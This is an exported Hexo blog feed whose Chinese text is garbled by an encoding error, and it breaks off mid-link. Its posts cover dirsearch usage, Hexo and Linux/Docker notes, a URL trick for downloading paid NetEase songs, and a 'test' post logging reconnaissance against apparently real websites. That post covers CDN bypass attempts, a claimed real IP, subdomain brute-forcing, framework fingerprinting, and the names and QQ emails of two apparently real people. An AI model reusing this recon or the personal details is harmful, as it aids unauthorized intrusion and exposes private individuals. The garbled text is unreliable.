åœ¨é€’å½’è¿‡ç¨‹ä¸­æ’é™¤æŒ‡å®šçš„å­ç›®å½•æ‰«æ(ç”¨é€—å·éš”å¼€)<br>-t THREADSCOUNT, â€“threads=THREADSCOUNT  è®¾ç½®æ‰«æçº¿ç¨‹<br>-x EXCLUDESTATUSCODES, â€“exclude-status=EXCLUDESTATUSCODES   æ’é™¤æŒ‡å®šçš„ç½‘ç«™çŠ¶æ€ç (ç”¨é€—å·éš”å¼€)<br>-c COOKIE, â€“cookie=COOKIE  è®¾ç½®cookie<br>â€“ua=USERAGENT, â€“user-agent=USERAGENT  è®¾ç½®ç”¨æˆ·ä»£ç†<br>-F, â€“follow-redirects  è·Ÿéšåœ°å€é‡å®šå‘æ‰«æ<br>-H HEADERS, â€“header=HEADERS è®¾ç½®è¯·æ±‚å¤´<br>â€“random-agents, â€“random-user-agents  è®¾ç½®éšæœºä»£ç†<br>â€“timeout=TIMEOUT   è®¾ç½®è¶…æ—¶æ—¶é—´<br>â€“ip=IP             è®¾ç½®ä»£ç†IPåœ°å€<br>â€“proxy=HTTPPROXY, â€“http-proxy=HTTPPROXY   è®¾ç½®httpä»£ç†ã€‚ä¾‹å¦‚127.0.0.1:8080<br>â€“max-retries=MAXRETRIES  è®¾ç½®æœ€å¤§çš„é‡è¯•æ¬¡æ•°<br>-b, â€“request-by-hostname  é€šè¿‡ä¸»æœºåè¯·æ±‚é€Ÿåº¦ï¼Œé»˜è®¤é€šè¿‡IP<br>â€“simple-report=SIMPLEOUTPUTFILE  ä¿å­˜ç»“æœï¼Œå‘ç°çš„è·¯å¾„<br>â€“plain-text-report=PLAINTEXTOUTPUTFILE  ä¿å­˜ç»“æœï¼Œå‘ç°çš„è·¯å¾„å’ŒçŠ¶æ€ç <br>â€“json-report=JSONOUTPUTFILE  ä»¥jsonæ ¼å¼ä¿å­˜ç»“æœ</p><p>è¿›å…¥dirsearchç›®å½•å<br>dbç›®å½•æ˜¯æ­¤æ¬¾å·¥å…·è‡ªå¸¦çš„å­—å…¸<br>reportsç›®å½•æ˜¯ä½ æ‰€æœ‰çˆ¬è¿‡çš„ç½‘ç«™</p><p>python3 ç¯å¢ƒä¸‹è¿è¡Œ<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirsearch.py -u <span class="number">10.0</span><span class="number">.3</span><span class="number">.45</span> -e php</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g3lohoi6vej30y90hrgnl.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>è§£å†³hexo å›¾ç‰‡403é—®é¢˜</title>
      <link href="/2019/05/17/%E8%A7%A3%E5%86%B3hexo-%E5%9B%BE%E7%89%87403%E9%97%AE%E9%A2%98/"/>
      <url>/2019/05/17/%E8%A7%A3%E5%86%B3hexo-%E5%9B%BE%E7%89%87403%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»Šå¤©å‘ç°æˆ‘çš„åšå®¢åŠ è½½ä¸é”™å›¾ç‰‡äº†<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g34cbtcs06j30o307qgm3.jpg" alt=""></p><p>ä½†æ˜¯å¦‚æœç›´æ¥å¤åˆ¶å›¾ç‰‡åœ°å€åˆ°æµè§ˆå™¨æ‰“å¼€çš„è¯æ˜¾ç¤ºæ­£å¸¸<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g34ccvztsrj30um07qmxf.jpg" alt=""><br>403 forbiddenï¼Œè¯´æ˜äº†è¿™ä¸ªç½‘ç»œèµ„æºè¿™æ ·è·å–æ˜¯è¢«æ‹’ç»çš„ï¼Œé‚£ä¹ˆé€šè¿‡ç®€å•çš„ç™¾åº¦ï¼Œæ‰¾åˆ°äº†ç›¸å…³çš„è§£å†³æ–¹æ³•ï¼Œå¹¶å»å®é™…å°è¯•</p><h1 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h1><p>è§£å†³æ–¹æ³• ï¼šåªéœ€è¦åœ¨å¤´éƒ¨æ·»åŠ ä¸€ä¸ªmeta <meta name="referrer" content="no-referrer"></p><p>å½“ç„¶åœ¨Hexoä¸­å‘¢ï¼Œåº”è¯¥åœ¨ä½ çš„ mdæ–‡ä»¶ä¸­æ·»åŠ metaï¼Œå¦‚ä¸‹ï¼š<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">test</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018</span><span class="bullet">-09</span><span class="bullet">-01</span> <span class="number">14</span><span class="string">:38:14</span></span><br><span class="line"><span class="attr">tags:</span> <span class="string">test,æµ‹è¯•</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">æµ‹è¯•</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"></span><br><span class="line"><span class="string">&lt;meta</span> <span class="string">name="referrer"</span> <span class="string">content="no-referrer"</span> <span class="string">/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™æ˜¯ä¸€ç¯‡æµ‹è¯•æ–‡ç« </span></span><br><span class="line"><span class="comment">## å†…å®¹</span></span><br></pre></td></tr></table></figure></p><p>è¿™æ ·åªè¦ä½ åœ¨æ¯ç¯‡æ–‡ç« ä¸­æ·»åŠ è¿™è¡Œmetaå°±å¯ä»¥è§£å†³å›¾ç‰‡ä¸æ˜¾ç¤ºçš„é—®é¢˜å•¦ï¼</p><p>ä¿®æ”¹æ–‡ç« æ¨¡æ¿<br>æ¯å½“ä½ ä½¿ç”¨å‘½ä»¤ hexo new â€˜æ–‡ç« åç§°â€™ æ–°å»ºä¸€ç¯‡æ–‡ç« æ—¶ï¼Œä½ å¯èƒ½éœ€è¦åœ¨é‡Œé¢ä¹¦å†™ <code>&lt;!--more--&gt;</code> ï¼Œæˆ–è€…è¿˜è¦å†™ metaï¼Œè¿™æ ·ä½ ä¼šè§‰å¾—å¾ˆéº»çƒ¦ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘è¯´ä¸‹ä¿®æ”¹æ¨¡æ¿çš„æ–¹æ³•ï¼Œè§£å†³ä½ æ¯æ¬¡éƒ½è¦å†™é‡å¤çš„å†…å®¹<br>æ‰“å¼€ä½ çš„åšå®¢ç›®å½•ä¸‹çš„ scaffolds/post.md æ–‡ä»¶<br>å®ƒé»˜è®¤æ˜¯è¿™æ ·çš„ï¼š<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">&#123;&#123;</span> <span class="string">title</span> <span class="string">&#125;&#125;</span></span><br><span class="line"><span class="attr">date:</span> <span class="string">&#123;&#123;</span> <span class="string">date</span> <span class="string">&#125;&#125;</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></p><p>ä½ å¯ä»¥å°†æ¯æ¬¡é‡å¤ä¹¦å†™çš„å†…å®¹æ”¾åœ¨é‡Œé¢ï¼Œè¿™æ ·æ¯æ¬¡æ–°å»ºçš„æ—¶å€™éƒ½è¦æŒ‰è¿™ä¸ªæ¨¡æ¿ç”Ÿæˆã€‚æˆ‘çš„æ¨¡æ¿å¦‚ä¸‹ï¼š<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">&#123;&#123;</span> <span class="string">title</span> <span class="string">&#125;&#125;</span></span><br><span class="line"><span class="attr">date:</span> <span class="string">&#123;&#123;</span> <span class="string">date</span> <span class="string">&#125;&#125;</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">&lt;meta</span> <span class="string">name="referrer"</span> <span class="string">content="no-referrer"</span> <span class="string">/&gt;</span></span><br></pre></td></tr></table></figure></p><p>æå®š~</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>ç½‘æ˜“äº‘éŸ³ä¹å…è´¹ä¸‹è½½</title>
      <link href="/2019/05/17/%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD/"/>
      <url>/2019/05/17/%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»Šå¤©æƒ³å‰ªéŸ³ä¹,äºæ˜¯å°†ä¸‹è½½çš„ncmæ ¼å¼è½¬æ¢ä¸ºMP3æ ¼å¼ï¼Œä½†æ˜¯è§‰å¾—æœ‰ç‚¹éº»çƒ¦ï¼Œäºæ˜¯åœ¨ç½‘ä¸Šå­¦åˆ°äº†å¦ä¸€ä¸ªæ–¹æ³•,å¯ä»¥ç›´æ¥ä¸‹è½½MP3æ ¼å¼,åŒ…æ‹¬å…è´¹ä¸‹è½½æ”¶è´¹æ­Œæ›²</p><h1 id="å¼€å§‹"><a href="#å¼€å§‹" class="headerlink" title="å¼€å§‹"></a>å¼€å§‹</h1><p>ç¬¬ä¸€æ­¥</p><p>æ‰“å¼€ç½‘æ˜“äº‘éŸ³ä¹ï¼Œéšä¾¿æ‰¾åˆ°ä¸€é¦–æ­Œï¼Œæ’­æ”¾ï¼Œå¤åˆ¶ç½‘å€çš„ID<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g349adfe3pj30wd0gmdju.jpg" alt=""></p><p>ç¬¬äºŒæ­¥<br>è¾“å…¥:<a href="http://music.163.com/song/media/outer/url?id=1344202958.mp3" target="_blank" rel="noopener">http://music.163.com/song/media/outer/url?id=1344202958.mp3</a></p><p>è¿™é‡Œçš„1344202958å°±æ˜¯æ­Œæ›²çš„ID,å¦‚æœè¦ä¸‹åˆ«çš„æ­Œæ›² ï¼Œåªéœ€è¦æ›¿æ¢idå³å¯</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g349cyo3i3j30ul0g8aan.jpg" alt=""><br>ç„¶åç‚¹å‡»å³é”®,å¦å­˜ä¸ºéŸ³é¢‘å³å¯</p><p>åˆ©ç”¨å¤–é“¾,æ­¤æ–¹æ³•é•¿æœŸæœ‰æ•ˆ,æœ‰ç©ºå¯ä»¥å†™ä¸ªå°å·¥å…·æ¥,hhh~</p><p>å¸Œæœ›æœ‰å¸®åŠ©~</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>linuxå­¦ä¹ ç¬”è®°</title>
      <link href="/2019/05/11/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/05/11/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br>ä¼‘å¤¸æ­¤åœ°åˆ†å¤©ä¸‹<br>linuxå¯åŠ¨httpæœåŠ¡<br>1ã€å®‰è£…apache</p><p>yum install httpd #æ ¹æ®æç¤ºï¼Œè¾“å…¥Yå®‰è£…å³å¯æˆåŠŸå®‰è£…</p><p>systemctl start httpd.service #å¯åŠ¨apache</p><p>systemctl stop httpd.service #åœæ­¢apache</p><p>systemctl restart httpd.service #é‡å¯apache</p><p>systemctl enable httpd.service #è®¾ç½®apacheå¼€æœºå¯åŠ¨</p><p>2ã€å¯åŠ¨httpæœåŠ¡</p><p>httpd -version #æ£€æŸ¥æ˜¯å¦å®‰è£…</p><p>yum install httpd #å®‰è£…httpæœåŠ¡</p><p>service httpd start #å¯åŠ¨httpæœåŠ¡</p><p>service httpd status #æ£€æŸ¥httpæœåŠ¡çŠ¶æ€ï¼ˆä¼šæ˜¾ç¤ºç»¿è‰²çš„active(running)è¡¨ç¤ºå¯åŠ¨æˆåŠŸï¼‰</p><p>service httpd restart #é‡å¯httpæœåŠ¡</p><p>3ã€é…ç½®æ–‡ä»¶</p><p>httpdç›¸å…³é…ç½®æ–‡ä»¶ï¼š</p><p>ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/httpd/conf/httd.conf ï¼Œè¿™ä¸ªæ˜¯httpdæœ€ä¸»è¦çš„é…ç½®æ–‡æ¡£</p><p>æ‰©å±•é…ç½®æ–‡ä»¶ï¼š<code>/etc/httpd/conf.d/*.conf</code> ï¼Œè¿™ä¸ªæ˜¯httpdçš„é¢å¤–é…ç½®æ–‡æ¡£</p><p>æ–‡æ¡£æ ¹ç›®å½•ï¼š /var/www/html ï¼Œè¿™ä¸ªæ˜¯apache é¦–é¡µçš„æ–‡æ¡£ç›®å½• ï¼Œå³è¾“å…¥<a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a>  æ˜¾ç¤ºé¡µé¢æ‰€åœ¨çš„ç›®å½•</p><p>æœåŠ¡è„šæœ¬ï¼š/etc/rc.d/init.d/httpd</p><p>é”™è¯¯ç›®å½•ï¼š/var/www/error  ï¼ŒæœåŠ¡å™¨è®¾å®šé”™è¯¯ï¼Œè¯·æ±‚çš„èµ„æºé”™è¯¯æˆ–æµè§ˆå™¨è®¿é—®å‡ºç°é”™è¯¯ç­‰é”™è¯¯æ–‡ä»¶çš„å­˜å‚¨ç›®å½•</p><p>CGIç›®å½•ï¼š /var/www/cgi-bin/   ï¼Œé¢„è®¾ä¸ºCGIè¿è¡Œè„šæœ¬çš„å­˜å‚¨ç›®å½•</p><p>æ—¥å¿—ç›®å½•ï¼š/var/log/httpd  ï¼Œclientç«¯ç™»å½•httpdæ—¶ï¼Œè®°å½•çš„ç™»å½•æ—¥å¿—ç­‰ä¿¡æ¯å­˜å‚¨ç›®å½•</p><p>è„šæœ¬é…ç½®æ–‡ä»¶ï¼š /etc/sysconfig/httpd</p><p>Listenç«¯å£ï¼š80/tcp  ,443/tcp</p><p>å‘½ä»¤æ‰§è¡Œæ–‡ä»¶ï¼š/usr/sbin/apachectl ï¼Œ/usr/sbin/httpdï¼Œ/usr/bin/htpasswd</p><p>PIDæ–‡ä»¶ï¼š/var/run/httpd/httpd.pid</p><p>4ã€å¼€æ”¾80ç«¯å£ æ‰“å¼€é˜²ç«å¢™</p><p>æŸ¥çœ‹æŒ‡å®šåŒºåŸŸæ‰€æœ‰å¼€å¯çš„ç«¯å£å·</p><p>firewall-cmd â€“zone=public â€“list-ports</p><p>åœ¨æŒ‡å®šåŒºåŸŸå¼€å¯ç«¯å£(å¦‚80ç«¯å£å·ï¼Œå‘½ä»¤æ–¹å¼)</p><p>firewall-cmd â€“zone=public â€“add-port=80/tcp â€“permanent</p><p>é‡æ–°å¯åŠ¨é˜²ç«å¢™</p><p>firewall-cmd â€“reload</p><p>å‚è€ƒç½‘å€ï¼š<a href="https://blog.csdn.net/u014079773/article/details/79745819" target="_blank" rel="noopener">https://blog.csdn.net/u014079773/article/details/79745819</a></p><p>5ã€æµ‹è¯•ç½‘é¡µ</p><p>echo â€œThis is my first web page.â€&gt;/var/www/html/index.html</p><p>æ‰“å¼€<a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> æŸ¥çœ‹æ˜¯å¦æ­£å¸¸å¯åŠ¨</p><p>yum install php</p><p>yum install mariadb-server mariadbsystemctl start mariadb<br>å¯åŠ¨mariadbsystemctl enable mariadb è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨</p><p><strong>ç›®å‰æ— æ³•å¤„ç†æ­¤è¯·æ±‚ã€‚</strong><br>åœ¨/ect/php.ini<br>å°†ä¸‹å€¼ç”±Off å˜æ›´ä¸º On<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">display_errors</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">display_startup_errors</span> = <span class="literal">On</span></span><br></pre></td></tr></table></figure></p><h1 id="å‘½ä»¤å­¦ä¹ "><a href="#å‘½ä»¤å­¦ä¹ " class="headerlink" title="å‘½ä»¤å­¦ä¹ "></a>å‘½ä»¤å­¦ä¹ </h1><p>grep<br>grepå‘½ä»¤ç”¨äºæŸ¥æ‰¾æ–‡ä»¶é‡Œç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²<br><strong>å®ä¾‹</strong><br>åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š<br><code>grep test *file</code><br>ä»¥é€’å½’çš„æ–¹å¼æŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼ŒæŸ¥æ‰¾æŒ‡å®šç›®å½•/etc/acpi åŠå…¶å­ç›®å½•ï¼ˆå¦‚æœå­˜åœ¨å­ç›®å½•çš„è¯ï¼‰ä¸‹æ‰€æœ‰æ–‡ä»¶ä¸­åŒ…å«å­—ç¬¦ä¸²â€flagâ€çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²æ‰€åœ¨è¡Œçš„å†…å®¹ï¼Œä½¿ç”¨çš„å‘½ä»¤ä¸ºï¼š<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -r flag <span class="regexp">/etc/</span>acpi</span><br></pre></td></tr></table></figure></p><h1 id="æ–‡ä»¶è§£æ"><a href="#æ–‡ä»¶è§£æ" class="headerlink" title="æ–‡ä»¶è§£æ"></a>æ–‡ä»¶è§£æ</h1><h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g3wz86xsvxj30kq03lglf.jpg" alt=""><br>ç”¨æˆ·åï¼šç”¨æˆ·ç™»å½•æ—¶ä½¿ç”¨ã€‚é•¿åº¦åº”åœ¨1åˆ°32ä¸ªå­—ç¬¦ä¹‹é—´ã€‚<br>å¯†ç ï¼šxå­—ç¬¦è¡¨ç¤ºåŠ å¯†å¯†ç å­˜å‚¨åœ¨/ etc / shadowæ–‡ä»¶ä¸­ã€‚è¯·æ³¨æ„ï¼Œæ‚¨éœ€è¦ä½¿ç”¨passwdå‘½ä»¤æ¥è®¡ç®—åœ¨CLIä¸­é”®å…¥çš„å¯†ç çš„å“ˆå¸Œå€¼ï¼Œæˆ–è€…åœ¨/ etc / shadowæ–‡ä»¶ä¸­å­˜å‚¨/æ›´æ–°å¯†ç çš„å“ˆå¸Œå€¼ã€‚<br>ç”¨æˆ·IDï¼ˆUIDï¼‰ï¼šå¿…é¡»ä¸ºæ¯ä¸ªç”¨æˆ·åˆ†é…ä¸€ä¸ªç”¨æˆ·IDï¼ˆUIDï¼‰ã€‚UID 0ï¼ˆé›¶ï¼‰ä¿ç•™ç»™rootï¼ŒUID 1-99ä¿ç•™ç»™å…¶ä»–é¢„å®šä¹‰å¸æˆ·ã€‚ç³»ç»Ÿä¸ºç®¡ç†å’Œç³»ç»Ÿå¸æˆ·/ç»„ä¿ç•™äº†è¿›ä¸€æ­¥çš„UID 100-999ã€‚<br>ç»„IDï¼ˆGIDï¼‰ï¼šä¸»è¦ç»„IDï¼ˆå­˜å‚¨åœ¨/ etc / groupæ–‡ä»¶ä¸­ï¼‰<br>ç”¨æˆ·IDä¿¡æ¯ï¼šè¯„è®ºå­—æ®µã€‚å®ƒå…è®¸æ‚¨æ·»åŠ æœ‰å…³ç”¨æˆ·çš„é¢å¤–ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·çš„å…¨åï¼Œç”µè¯å·ç ç­‰ã€‚æ­¤å­—æ®µç”±fingerå‘½ä»¤ä½¿ç”¨ã€‚<br>ä¸»ç›®å½•ï¼šç”¨æˆ·ç™»å½•æ—¶æ‰€åœ¨ç›®å½•çš„ç»å¯¹è·¯å¾„ã€‚å¦‚æœæ­¤ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ç”¨æˆ·ç›®å½•å°†å˜ä¸º/<br>Command / shellï¼šå‘½ä»¤æˆ–shellçš„ç»å¯¹è·¯å¾„ï¼ˆ/ bin / bashï¼‰ã€‚é€šå¸¸ï¼Œè¿™æ˜¯ä¸€ä¸ªshellã€‚è¯·æ³¨æ„ï¼Œå®ƒä¸å¿…æ˜¯ä¸€ä¸ªshell</p><p>å‚è€ƒ:<a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/" target="_blank" rel="noopener">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>dockerå­¦ä¹ </title>
      <link href="/2019/05/11/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/05/11/docker%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br><strong>æŸ¥çœ‹</strong><br>docker ps: æŸ¥çœ‹å½“å‰è¿è¡Œçš„å®¹å™¨</p><p>docker ps -a:æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ŒåŒ…æ‹¬åœæ­¢çš„ã€‚</p><p><strong>å¯åŠ¨</strong></p><p>å®¹å™¨åï¼šdocker start docker_runï¼Œ</p><p>æˆ–è€…IDï¼šdocker start 43e3fef2266c</p><p><strong>ç»ˆæ­¢</strong><br>docker stop [NAME]/[CONTAINER ID]:å°†å®¹å™¨é€€å‡ºã€‚<br>docker kill [NAME]/[CONTAINER ID]:å¼ºåˆ¶åœæ­¢ä¸€ä¸ªå®¹å™¨ã€‚</p><p><strong>åˆ é™¤</strong></p><p>docker rm [NAME]/[CONTAINER ID]:ä¸èƒ½å¤Ÿåˆ é™¤ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œä¼šæŠ¥é”™ã€‚éœ€è¦å…ˆåœæ­¢å®¹å™¨ã€‚</p><h1 id="ä¿®æ”¹dockerå®¹å™¨ç«¯å£æ˜ å°„"><a href="#ä¿®æ”¹dockerå®¹å™¨ç«¯å£æ˜ å°„" class="headerlink" title="ä¿®æ”¹dockerå®¹å™¨ç«¯å£æ˜ å°„"></a>ä¿®æ”¹dockerå®¹å™¨ç«¯å£æ˜ å°„</h1><p>docker ps: æŸ¥çœ‹å½“å‰è¿è¡Œçš„å®¹å™¨</p><p>åœæ­¢dockeræœåŠ¡(systemctl stop docker)</p><p>ä¿®æ”¹è¿™ä¸ªå®¹å™¨çš„hostconfig.jsonæ–‡ä»¶ä¸­çš„ç«¯å£<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /var/<span class="class"><span class="keyword">lib</span>/<span class="title">docker</span>/<span class="title">containers</span>/3<span class="title">b6ef264a040</span>* <span class="comment">#è¿™é‡Œæ˜¯CONTAINER ID</span></span></span><br><span class="line">vi hostconfig.json</span><br><span class="line">å¦‚æœä¹‹å‰æ²¡æœ‰ç«¯å£æ˜ å°„, åº”è¯¥æœ‰è¿™æ ·çš„ä¸€æ®µ:</span><br><span class="line"><span class="string">"PortBindings"</span>:&#123;&#125;</span><br><span class="line">å¢åŠ ä¸€ä¸ªæ˜ å°„, è¿™æ ·å†™:</span><br><span class="line"><span class="string">"PortBindings"</span>:&#123;<span class="string">"3306/tcp"</span>:[&#123;<span class="string">"HostIp"</span>:<span class="string">""</span>,<span class="string">"HostPort"</span>:<span class="string">"3307"</span>&#125;]&#125;</span><br><span class="line">å‰ä¸€ä¸ªæ•°å­—æ˜¯å®¹å™¨ç«¯å£, åä¸€ä¸ªæ˜¯å®¿ä¸»æœºç«¯å£.</span><br><span class="line">è€Œä¿®æ”¹ç°æœ‰ç«¯å£æ˜ å°„æ›´ç®€å•, æŠŠç«¯å£å·æ”¹æ‰å°±è¡Œ.</span><br></pre></td></tr></table></figure></p><p>å¦‚æœconfig.v2.jsoné‡Œé¢ä¹Ÿè®°å½•äº†ç«¯å£ï¼Œä¹Ÿè¦ä¿®æ”¹<br>å¯åŠ¨dockeræœåŠ¡(systemctl start docker)</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>test</title>
      <link href="/2019/05/08/test/"/>
      <url>/2019/05/08/test/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br>ç›®æ ‡ç«™:<a href="http://www.dnfzhushou3.cn" target="_blank" rel="noopener">www.dnfzhushou3.cn</a><br>å‘ç°æœ‰cdn<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ubcgox0hj30n20g2q96.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u8qym5r7j30qc0en3zs.jpg" alt=""><br>ç‹å¥é¹<br><a href="mailto:3110582594@qq.com" target="_blank" rel="noopener">3110582594@qq.com</a>    é‚®ç®±è¿›è¡ŒåæŸ¥<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u8rq89p4j30yr0bgq49.jpg" alt=""></p><p><a href="http://www.dnfzhushou3.cn" target="_blank" rel="noopener">www.dnfzhushou3.cn</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u94c5gqhj30rf083dgi.jpg" alt=""><br>jjkioop3.cn    çœŸå®ip(47.112.26.26)<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u96t0pysj30sa09uq3s.jpg" alt=""><br>hgjfde.cn<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9br86o8j30rk079t95.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u8wtfmurj30ri0g475r.jpg" alt=""></p><p><a href="http://www.97dounai.cnï¼ˆä¹ŸåŠ äº†cdnï¼‰" target="_blank" rel="noopener">www.97dounai.cnï¼ˆä¹ŸåŠ äº†cdnï¼‰</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9cuskk5j30sk07wmxu.jpg" alt=""><br>é»„è‰<br><a href="mailto:851945109@qq.com" target="_blank" rel="noopener">851945109@qq.com</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u8yt4bwfj30vs0fpjt6.jpg" alt=""></p><p>è¾“å…¥<a href="http://www.97dounai.cn" target="_blank" rel="noopener">www.97dounai.cn</a> ä¼šè·³åˆ°<a href="https://www.gofuncoin.com/ï¼ˆä¹ŸåŠ äº†cdnï¼‰" target="_blank" rel="noopener">https://www.gofuncoin.com/ï¼ˆä¹ŸåŠ äº†cdnï¼‰</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9f6bhclj30s707mwf6.jpg" alt=""></p><p>å¯¹<a href="https://www.gofuncoin.com/è¿›è¡ŒæŒ‡çº¹è¯†åˆ«" target="_blank" rel="noopener">https://www.gofuncoin.com/è¿›è¡ŒæŒ‡çº¹è¯†åˆ«</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9iyep48j30xw0fot9b.jpg" alt=""></p><p><a href="http://www.97dounai.cn" target="_blank" rel="noopener">www.97dounai.cn</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9y70dqxj30rf08dgml.jpg" alt=""></p><p>å¯¹<a href="https://www.gofuncoin.com/ï¼Œwww.dnfzhushou3.cn" target="_blank" rel="noopener">https://www.gofuncoin.com/ï¼Œwww.dnfzhushou3.cn</a> è¿›è¡Œå­åŸŸåçˆ†ç ´ æ— æœ~</p><p>åˆ©ç”¨å›½å¤–pingï¼Œdnsè§£æè®°å½•ç»•cdn æ— æœ~</p><p>ç°åœ¨ä»<a href="http://www.gofuncoin.comä½¿ç”¨æ¡†æ¶çœ‹çœ‹" target="_blank" rel="noopener">www.gofuncoin.comä½¿ç”¨æ¡†æ¶çœ‹çœ‹</a>~<br>thinkcmfæ˜¯å¼€æºæ¡†æ¶ ï¼ŒåŸºäºthinkphp<br>github:<a href="https://github.com/thinkcmf/thinkcmf" target="_blank" 